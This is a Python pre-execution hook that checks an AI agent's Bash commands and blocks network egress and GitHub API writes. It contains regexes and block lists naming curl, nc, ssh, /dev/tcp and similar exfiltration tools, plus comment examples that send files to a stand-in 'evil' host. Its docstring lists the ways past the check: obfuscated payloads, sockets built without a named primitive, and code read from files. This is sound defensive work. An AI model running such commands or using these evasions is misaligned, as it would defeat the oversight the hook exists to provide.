#!/usr/bin/env python3
"""PreToolUse hook (matcher: Bash) — raise the egress speed bump the security stream points at.

Under `defaultMode: bypassPermissions` only `permissions.deny` enforces, and per-binary denies
CANNOT be a real network-egress boundary while `python3`/`node`/`npx` stay on the allow list
(see docs/security-model.md and settings.README.md — the interpreters open sockets themselves,
so denying `curl`/`wget` proves nothing). This hook inspects the Bash command's argv BEFORE it
runs and blocks the OBVIOUS, common egress forms those docs name that no deny rule can catch:

  1. INTERPRETER / SHELL inline-code egress one-liners — the argument to an interpreter's
     inline-eval flag (`python3 -c 'import urllib.request; ...'`, `node -e 'fetch(...)'`,
     `ruby/perl -e`, `php -r`, `bash -c '... curl ...'`) scanned for a named outbound primitive;
  2. BARE network primitives as the command word (`curl`/`wget`/`ncat`/`nc`/`telnet`, plus the
     remote-shell/copy/socket family `ssh`/`scp`/`sftp`/`rsync`/`socat`/`ftp`) or a
     `/dev/tcp`//dev/udp redirect in any command piece — the anchored `Bash(curl *)` deny only
     fires when the primitive is the FIRST word, so one after `&&`/`;`/`|` (or behind a prefix)
     slips it (security-model.md:9);
  3. `gh api` WRITES in any argv position — `gh api /repos/O/R -X DELETE` slips past the prefix
     deny because the write flag follows the URL (security-model.md:28); parsing argv sees the
     method wherever it sits, and flags gh's implicit-POST field flags too.

To keep this from being N brittle per-form branches (each a bypass a sibling form slips), argv
is CANONICALIZED once before scanning: `_hookutil.strip_prefixes()` strips every leading prefix
(grouping noise, bare `NAME=VAL` env assignments, `sudo`/`doas`, value-consuming wrappers) to
reach the real command word — shared with every other rail that reads a command word (#193), not
reimplemented here — then this hook reads inline-code flags through a single walk that handles
bundled/glued/separate forms uniformly. One normalization pass, one scanner — not a branch per
tokenization quirk.

This is an HONEST speed bump, not a seal. It raises the bar on the casual / accidental / obvious
path — exactly what the deny list already aims at — but a determined caller still gets through:
base64- or variable-obfuscated payloads, sockets built without a named primitive, and interpreters
that read their code from a file or stdin are all invisible here. Closing that for real needs
OS-level network sandboxing (egress firewall / netns), not a command parser. The `gh api` branch
is now the live enforcement point: the blanket `Bash(gh api *)` deny was narrowed (#76/#101) to the
two write-method forms so read-only GETs are re-allowed, and this branch catches writes in any argv
position that the prefix deny misses.

Fail-open on any error — a hook bug must never wedge the session (repo convention; the deny list
remains as the belt to this hook's suspenders). Exit 2 = block; exit 0 = allow.
"""
import re
import sys

from _hookutil import basename, gh_subcommand, hook_tool_input, load_hook_input, pieces, strip_prefixes

# Per-interpreter inline-code flags. Only the flags that actually take *code* — `-c` is code for
# python/shell but a syntax check for node/ruby/perl, so it is NOT listed for those; `-p` prints
# code for node but is a loop wrapper for perl. Getting this per-family right avoids blocking an
# innocent `perl -n file.log`. Bundled/glued forms (perl/ruby `-pe`/`-ne`, python `-Ic`) are
# decomposed by the single flag walk in inline_payloads(), not by per-family special cases.
INLINE_FLAGS = {
    "python": {"-c"}, "python2": {"-c"}, "python3": {"-c"},
    "node": {"-e", "--eval", "-p", "--print"}, "nodejs": {"-e", "--eval", "-p", "--print"},
    "bun": {"-e", "--eval", "-p", "--print"}, "deno": {"-e", "--eval"},
    "ruby": {"-e"}, "perl": {"-e", "-E"}, "php": {"-r"},
    "bash": {"-c"}, "sh": {"-c"}, "zsh": {"-c"}, "dash": {"-c"},
    "lua": {"-e"}, "Rscript": {"-e"}, "julia": {"-e"},
}
INTERPRETERS = set(INLINE_FLAGS)
# Versioned interpreter basenames (`python3.11`, `python2.7`, `perl5.36`, `ruby3.0`) are a normal,
# non-obfuscated invocation form present on most distros, but they miss the exact-basename
# INTERPRETERS lookup. VERSION_SUFFIX_RE strips a trailing `X` or `X.Y[.Z]` version so the family
# key can be recovered — else `python3.11 -c '...urllib...'` slips past the inline scan. (#112)
VERSION_SUFFIX_RE = re.compile(r"^([a-z]+)(\d+)(?:\.\d+)*$")

# Command-binary vocabulary shared by NET_RE (below) and BARE_NET_BINARIES: the same binary is an
# exfil primitive whether it shows up as a bare command word or inside an interpreter's inline-code
# payload, so it must be flagged in both surfaces. Defining it once here means a new binary lands
# in both places at once — the single-surface drift that split the ssh family into two separate
# issues (#131 for BARE_NET_BINARIES, #158 for NET_RE) can't recur. This is only the command-binary
# subset: NET_RE also matches library primitives (urllib, fetch(), Net::HTTP, ...) that have no bare
# command-word form, so those stay hand-written in NET_RE itself.
NET_BINARIES = (
    "curl", "wget", "ncat", "nc", "netcat", "telnet",
    "ssh", "scp", "sftp", "rsync", "socat", "ftp",
)
NET_BINARIES_RE_ALT = " | ".join(rf"\b{b}\b" for b in NET_BINARIES)

# Named outbound primitives across python / node / ruby / perl / php / shell. A match inside an
# inline-code payload means "this one-liner reaches the network" — the exfil/fetch the docs name.
# The trailing bare-binary group mirrors BARE_NET_BINARIES so an interpreter-wrapped invocation
# (`bash -c 'ssh evil'`, `python3 -c 'os.system("scp f evil:")'`) is caught the same as the bare
# command word (#158) — closing the curl-vs-ssh asymmetry where only curl was scanned in payloads.
# These are `\bword\b` substring matches (like `\bcurl\b`), so an innocent mention inside a payload
# string/identifier can false-positive; that is the accepted speed-bump cost the block message names.
NET_RE = re.compile(
    r"""
      \burllib\b | \burlopen\b | \brequests\b | \bhttpx\b | \burllib3\b | \bhttp\.client\b | \bhttplib\b
    | \bsmtplib\b | \bftplib\b | \btelnetlib\b | \bpoplib\b | \bimaplib\b | \bparamiko\b
    | \bsocket\.socket\b | \bsocket\.create_connection\b | \bcreate_connection\s*\( | \basyncio\.open_connection\b
    | \bfetch\s*\( | \bXMLHttpRequest\b | \baxios\b | \bnode-fetch\b | \bgot\s*\(
    | require\(\s*['"`](?:node:)?(?:http|https|net|tls|dgram)['"`]\s*\)
    | \bhttps?\.(?:get|request)\s*\( | \bnet\.(?:connect|createConnection)\s*\(
    | \btls\.connect\s*\( | \bDeno\.connect\s*\(
    | \bNet::HTTP\b | \bIO::Socket\b | \bLWP\b | \bHTTP::Tiny\b | \bHTTP::Request\b
    | \bfsockopen\b | \bstream_socket_client\b | \bcurl_exec\b | \bcurl_init\b
    | \b(?:file_get_contents|fopen)\s*\(\s*['"]https?:// | \bURI\.open\b | \bopen\s*\(\s*['"]https?://
    | """ + NET_BINARIES_RE_ALT + r""" | /dev/tcp/
    """,
    re.VERBOSE,
)

# A net binary invoked as the command word ITSELF — not inside an interpreter payload — is the
# other half of the anchored-deny gap (#115): `Bash(curl *)` matches only when `curl` is the
# first word, so `… && curl …` or `sudo curl …` slips it. Checked against the command word after
# prefix-stripping (unambiguous, unlike a substring scan of the whole line), plus a token scan for
# bash's `/dev/tcp`//dev/udp egress redirect (`echo x > /dev/tcp/host/port`). The remote-shell /
# copy / socket family (`ssh`/`scp`/`sftp`/`rsync`/`socat`/`ftp`) is the same class (#131): they
# are exfil primitives too and the `Bash(ssh *)`/`Bash(scp *)` denies likewise fire only on the
# first word — a chained/prefixed `… && ssh evil` slips both the deny and this check without them.
BARE_NET_BINARIES = set(NET_BINARIES)
DEV_TCP_RE = re.compile(r"/dev/(?:tcp|udp)/")

# `gh api` write signals: an explicit mutating method, or gh's implicit-POST field/body flags.
WRITE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
FIELD_FLAGS = {"-f", "-F", "--field", "--raw-field", "--input"}
# gh api's own boolean short flags — pflag lets these bundle ahead of a value-taking short flag
# in the same token (`-iXPOST`, `-iFquery=x`), so a fixed-position tok[1] read misses them (#271).
# `-i`/`--include` is the only one gh api defines today.
GH_API_BOOL_SHORT_OPTS = "i"
# GraphQL is always POSTed at the HTTP layer even for a read, so `gh api graphql -f query=...`'s
# implicit-POST field flag can't be distinguished from a real mutation by argv shape alone (#111) —
# only the query BODY says which. `mutation` is the GraphQL keyword that starts a real mutation
# operation; an unlabeled or explicit `query` operation (GraphQL allows omitting the keyword) has
# no reason to contain it.
GRAPHQL_MUTATION_RE = re.compile(r"\bmutation\b")
# gh api's own flags that take a value in their separate-token form (`-H value`, as opposed to a
# glued `--header=value`, which is one self-contained token), so a scan for the REST/GraphQL
# endpoint positional can walk past one sitting ahead of it (`gh api --paginate graphql ...`,
# `gh api -H 'Accept: x' graphql ...`, #282) instead of assuming the endpoint is always argv[2].
# Superset of FIELD_FLAGS (already value-taking) plus gh api's other value flags; -X/--method is
# tracked by its own branch in gh_api_is_write() but also consumes a following value here, same as
# every other value flag in this set. `-R`/`--repo` (gh's own global repo-override flag, same one
# `_hookutil.GH_GLOBAL_VALUE_OPTS` walks past for the subcommand) was missing (#301): `gh api -R
# owner/repo graphql ...` misread `owner/repo` itself as the endpoint, breaking the graphql
# read/write carve-out below.
GH_API_VALUE_OPTS = FIELD_FLAGS | {
    "-X", "--method", "-H", "--header", "--cache", "-p", "--preview", "-q", "--jq", "-t",
    "--template", "--hostname", "-R", "--repo",
}


def _gh_api_endpoint(argv):
    """Return the first positional token (the REST/GraphQL endpoint) in a `gh api ...` argv
    already anchored to `["gh", "api", ...rest]`, walking past gh api's own leading flags — the
    same shape as `gh_subcommand()`/npm's `_npm_subcommand()` walking past a CLI's global flags —
    or None if there's no positional at all. A glued `--flag=value` or bare boolean short flag is
    one self-contained token either way; only a `GH_API_VALUE_OPTS` token needs its separate next
    token skipped too."""
    i, n = 2, len(argv)
    while i < n:
        tok = argv[i]
        if tok in GH_API_VALUE_OPTS:
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        return tok
    return None


def _unreadable_field_value(v):
    """True if a `-f`/`-F` field value isn't a literal this scan can read: an `@file` reference,
    or embedded command/process substitution (`$(cat mutation.graphql)`, `` `cat x` ``) — shlex
    keeps the quoted span as one literal token, so the substitution never runs here and the real
    body text (which could be anything, including a mutation) is invisible to the regex (#283).
    """
    val = v.split("=", 1)[-1]
    return val.startswith("@") or "$(" in val or "`" in val


def canonical_interpreter(cmd):
    """Map a possibly-versioned interpreter basename to its INTERPRETERS key, else return cmd.

    `python3.11` -> `python3`, `python2.7` -> `python2`, `perl5.36` -> `perl`. Exact matches pass
    through untouched; a non-interpreter word (e.g. `gh`, `python3-config`) returns unchanged.
    """
    if cmd in INTERPRETERS:
        return cmd
    m = VERSION_SUFFIX_RE.match(cmd)
    if m:
        base, major = m.group(1), m.group(2)
        for cand in (base + major, base):  # python3.11 -> python3, then bare python
            if cand in INTERPRETERS:
                return cand
    return cmd


def inline_payloads(cmd, argv):
    """Yield every inline-code string this interpreter argv runs, via ONE normalization walk.

    All flag shapes are decomposed uniformly so no single form slips: separate-arg (`-c CODE`),
    glued (`-cCODE`), long (`--eval CODE` / `--eval=CODE`), and short-flag BUNDLES that end in or
    carry the family's code letter — `-Ic CODE`, `-IcCODE` (#105/#120), perl/ruby `-ne'CODE'`,
    `-pe'CODE'` (#126). For a single-dash bundle we walk to the FIRST code-flag letter for this
    family (`c`/`e`/`E`/`r`/`p`); the glued remainder is the payload, or the next argv token when
    the letter ends the bundle. Preceding letters are treated as boolean options, so `perl -n
    file.log` (n is not a perl code letter) yields nothing — no false block on an innocent loop.
    """
    flags = INLINE_FLAGS.get(cmd, set())
    code_letters = {f[1] for f in flags if len(f) == 2}    # single-char code flags: c / e / E / r / p
    long_flags = {f for f in flags if f.startswith("--")}  # --eval / --print
    if cmd == "deno" and len(argv) >= 3 and argv[1] == "eval":
        yield " ".join(argv[2:])  # `deno eval CODE...` (subcommand, not a flag)
    j = 1
    while j < len(argv):
        tok = argv[j]
        if tok.startswith("--"):
            name, eq, tail = tok.partition("=")
            if name in long_flags:
                if eq:
                    yield tail                    # --eval=CODE
                elif j + 1 < len(argv):
                    j += 1
                    yield argv[j]                 # --eval CODE
        elif tok.startswith("-") and len(tok) > 1 and code_letters:
            for k in range(1, len(tok)):
                if tok[k] in code_letters:
                    if k + 1 < len(tok):
                        yield tok[k + 1:]         # glued: -cCODE / -IcCODE / -ne'CODE'
                    elif j + 1 < len(argv):
                        j += 1
                        yield argv[j]             # separate: -c CODE / -Ic CODE
                    break
        j += 1


def gh_api_is_write(argv):
    """True if this `gh api ...` argv mutates state (explicit method or implicit-POST fields).

    Field/body flags are matched in every shape gh/pflag accepts: exact (`-f`, `--field`),
    long-glued (`--field=x=y`), and short-glued (`-ftitle=x`, `-Fkey=@file`) — the last of which
    is a real state-mutating POST that the exact/long checks alone miss (#121), mirroring the
    glued `-XPOST` method handling. A short-option bundle may also carry one of gh's own boolean
    flags ahead of the code letter (`-iXPOST`, `-iFquery=x` — pflag bundling, #271); the bundle
    walk below skips a leading run of GH_API_BOOL_SHORT_OPTS before reading the tail letter,
    mirroring how inline_payloads() walks bundled interpreter flags.

    `gh api graphql` gets one carve-out (#111): with NO explicit `-X`/`--method`, the generic
    "any field flag implies POST" heuristic above would hard-block the standard
    `gh api graphql -f query='...'` read pattern (GraphQL is always POSTed at the HTTP layer, read
    or write). For that one endpoint, an implicit method is instead decided by the field VALUES
    themselves via GRAPHQL_MUTATION_RE. Any body source this scan can't read as a literal string —
    a `-f`/`-F` `@file` reference, OR gh's `--input FILE`/`--input -` file-or-stdin body
    convention (#265: `--input` is a FIELD_FLAGS member so it always implied POST, but a naive
    carve-out that only checked `-f`/`-F` values for `@file` would scan `--input`'s own value —
    a bare filename or `-`, never the body text — find no `mutation` substring, and silently
    ALLOW an unreadable, possibly-mutating body), OR a value embedding command/process substitution
    (`-f query="$(cat mutation.graphql)"` / backtick form — shlex keeps the quoted span as one
    literal token, so the substitution never runs here and the real body text is invisible, #283)
    — fails CLOSED (blocked) here, the same "can't see inside a file" limitation this hook already
    accepts everywhere else, rather than silently downgrading an unreadable body to an allow.
    """
    method = None
    explicit_method = False
    field_values = []
    unreadable_body = False
    for j, tok in enumerate(argv):
        if tok in ("-X", "--method"):
            if j + 1 < len(argv):
                method = argv[j + 1].upper()
                explicit_method = True
        elif tok.startswith("--method="):
            method = tok.split("=", 1)[1].upper()
            explicit_method = True
        elif tok == "--input" or tok.startswith("--input="):
            unreadable_body = True  # file path or `-` (stdin), never an inline literal (#265)
            if method is None:
                method = "POST"
        elif tok in FIELD_FLAGS:
            if j + 1 < len(argv):
                field_values.append(argv[j + 1])  # separate: -f query=... / --field query=...
            if method is None:
                method = "POST"  # gh defaults to POST when any field/body flag is present (#121)
        elif "=" in tok and tok.split("=", 1)[0] in FIELD_FLAGS:
            field_values.append(tok.split("=", 1)[1])  # long-glued: --field=query=...
            if method is None:
                method = "POST"
        elif tok.startswith("-") and not tok.startswith("--") and len(tok) > 1:
            k = 1
            while k < len(tok) and tok[k] in GH_API_BOOL_SHORT_OPTS:
                k += 1
            if k >= len(tok):
                continue  # entirely boolean short flags (e.g. bare `-i`) — no code letter reached
            letter, tail = tok[k], tok[k + 1:]
            if letter == "X":
                if tail:
                    method = tail.upper()             # glued: -XPOST / -iXPOST
                    explicit_method = True
                elif j + 1 < len(argv):
                    method = argv[j + 1].upper()       # separate: -X POST / -iX POST
                    explicit_method = True
            elif letter in ("f", "F"):
                if tail:
                    field_values.append(tail)              # glued: -ftitle=x / -iFquery=@file
                elif j + 1 < len(argv):
                    field_values.append(argv[j + 1])       # separate after bundle: -iF query=...
                if method is None:
                    method = "POST"  # glued short field flag, incl. bundled (`-ftitle=x`, `-iFkey=x`)

    if not explicit_method and method == "POST" and _gh_api_endpoint(argv) == "graphql":
        if unreadable_body or any(_unreadable_field_value(v) for v in field_values):
            return True  # can't inspect the body as a literal — fail closed, never fall open (#265, #283)
        return any(GRAPHQL_MUTATION_RE.search(v) for v in field_values)
    return method in WRITE_METHODS


def offending(command):
    """Return a human reason string if any command piece is a blocked egress form, else None."""
    for argv in pieces(command):
        argv = strip_prefixes(argv)
        if not argv:
            continue
        cmd = canonical_interpreter(basename(argv[0]))

        if cmd == "eval" and len(argv) >= 2:
            # `eval` runs its argument string AS a command, but it is not an interpreter with an
            # inline-code flag — so its payload is never re-scanned unless we re-feed it. Join the
            # remaining argv tokens and run them back through the same pass, the way an inline-code
            # payload is scanned: `eval "curl …"`, `eval curl …`, `eval "python3 -c '…urllib…'"` all
            # reach the network. One more code-runner into the existing canonicalization pass, not a
            # sibling branch (CLAUDE.md #129). Recursion terminates: each pass drops the `eval` word.
            inner = offending(" ".join(argv[1:]))
            if inner:
                return inner

        if cmd in INTERPRETERS:
            for payload in inline_payloads(cmd, argv):
                if NET_RE.search(payload):
                    return (
                        f"an inline `{cmd}` one-liner that opens a network connection "
                        f"(matched an outbound primitive in its inline-code payload)"
                    )

        if cmd == "gh":
            sub = gh_subcommand(argv)
            # Re-anchored to a normalized ["gh", "api", ...] so gh_api_is_write()'s own argv[2]
            # graphql check still lands correctly regardless of a leading `-R`/`--repo` (#284).
            if sub and sub[0] == "api" and gh_api_is_write(["gh", "api"] + sub[1]):
                return "a `gh api` call with a write method (POST/PUT/PATCH/DELETE or an implicit-POST field flag)"

        if cmd in BARE_NET_BINARIES:
            return (
                f"a bare `{cmd}` network call as a command word (the anchored `Bash({cmd} *)` "
                f"deny only catches it as the first word, not after `&&`/`;`/`|` or a prefix)"
            )

        if any(DEV_TCP_RE.search(tok) for tok in argv):
            return "a `/dev/tcp` (or `/dev/udp`) network redirect (a bash built-in socket, not a real file)"

    return None


def check(command, cwd):
    """Dispatcher-facing predicate (#163): (command, cwd) -> full block message, or None.

    `cwd` is unused here — this rail needs no repo state — but the parameter is part of the
    shared `check(command, cwd) -> reason | None` contract `pretooluse-bash.py` registers every
    rail against, so every predicate takes it even when it's ignored.
    """
    reason = offending(command)
    if not reason:
        return None
    return (
        "Egress speed bump (PreToolUse): this Bash command was blocked because it looks like "
        f"{reason}. Direct network egress from an interpreter or a `gh api` write is not an "
        "approved path here (docs/security-model.md). If you need to fetch a URL use WebFetch/"
        "WebSearch; for GitHub reads use the read-only `gh` subcommands or a `gh api ... GET`. "
        "If this is a legitimate non-egress command that tripped a substring match, restructure "
        "it so the flagged token isn't present."
    )


def main():
    data = load_hook_input(sys.stdin)
    if data is None:
        sys.exit(0)

    if data.get("tool_name") != "Bash":
        sys.exit(0)

    command = hook_tool_input(data).get("command")
    if not isinstance(command, str):
        sys.exit(0)

    try:
        message = check(command, data.get("cwd") or None)
    except Exception:
        sys.exit(0)  # never wedge the session on a hook bug

    if not message:
        sys.exit(0)

    print(message, file=sys.stderr)
    sys.exit(2)


if __name__ == "__main__":
    main()
